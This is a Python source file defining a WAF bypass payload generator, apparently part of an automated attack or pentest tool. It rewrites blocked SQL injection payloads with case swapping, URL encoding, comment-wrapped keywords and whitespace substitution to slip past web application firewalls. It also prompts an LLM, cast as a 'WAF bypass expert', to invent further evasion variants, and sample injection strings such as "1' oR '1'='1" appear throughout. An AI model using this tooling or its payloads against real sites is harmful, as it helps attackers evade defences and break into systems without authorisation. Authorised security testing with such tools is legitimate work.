import random
import urllib.parse
import re
from core.logger import log

from typing import List


class WafBypassPayloadGenerator:
    def __init__(self, context_manager):
        self.context_manager = context_manager

    def _apply_transformations(self, payload: str) -> List[str]:
        """Applies a series of deterministic transformations to a payload."""
        transformed_payloads = set()

        # 1. Case Swapping
        transformed_payloads.add(
            "".join(
                c.upper() if random.random() > 0.5 else c.lower() for c in payload))

        # 2. URL Encoding (full and partial)
        transformed_payloads.add(urllib.parse.quote(payload))
        transformed_payloads.add(
            urllib.parse.quote(
                payload, safe='='))  # Encode less

        # 3. Space to Comment
        if ' ' in payload:
            transformed_payloads.add(payload.replace(' ', '/**/'))

        # 4. Space to other characters
        if ' ' in payload:
            transformed_payloads.add(payload.replace(' ', '+'))
            transformed_payloads.add(payload.replace(' ', '%09'))  # Tab

        # 5. Keyword obfuscation with comments
        keywords = ['SELECT', 'UNION', 'AND', 'OR', 'FROM', 'WHERE']
        for keyword in keywords:
            if keyword in payload.upper():
                transformed_payloads.add(
                    re.sub(
                        f'(?i){keyword}',
                        f'/*|{keyword}|*/',
                        payload))

        log.info(
            f"Generated {len(transformed_payloads)} payloads via deterministic transformations.")
        return list(transformed_payloads)

    def generate_payloads(self, original_payload: str) -> List[str]:
        """
        Generates a list of potential WAF bypass payloads using transformations and an LLM.
        """
        log.info(f"Generating WAF bypass payloads for: {original_payload}")

        # Generate baseline payloads with transformations
        generated_payloads = self._apply_transformations(original_payload)

        # Use LLM for more creative payloads
        prompt = self._build_prompt(original_payload)
        try:
            response = self.context_manager.orchestrator.call_llm_func(
                prompt, context="WafBypassPayloadGenerator")
            if response and "payloads" in response:
                llm_payloads = response["payloads"]
                log.success(
                    f"Generated {len(llm_payloads)} additional payloads via LLM.")
                generated_payloads.extend(llm_payloads)
            else:
                log.warning("LLM did not return any bypass payloads.")
        except Exception as e:
            log.error(
                f"Failed to generate bypass payloads from LLM: {e}",
                exc_info=True)

        # Remove duplicates and return
        return list(set(generated_payloads))

    def _build_prompt(self, original_payload: str) -> str:
        return f"""
        You are a WAF bypass expert. Given the following payload that was blocked, generate a list of 5-10 variations that might bypass a WAF.
        Consider techniques like:
        - Case swapping (e.g., sElEcT)
        - URL encoding (e.g., %20 for space)
        - Null byte injection (e.g., %00)
        - Obfuscation with comments (e.g., /*!SELECT*/)
        - Using different character encodings.
        - Inserting junk characters.
        - Using different request methods (e.g., POST instead of GET).
        - HTTP Parameter Pollution.

        **Original Payload:**
        `{original_payload}`

        **Your Task:**
        Return ONLY a valid JSON object with a single key "payloads", which is a list of strings.

        **Example Response:**
        {{
            "payloads": [
                "1' oR '1'='1",
                "1%27%20oR%20%271%27%3D%271",
                "1 /*!OR*/ '1'='1'"
            ]
        }}"""
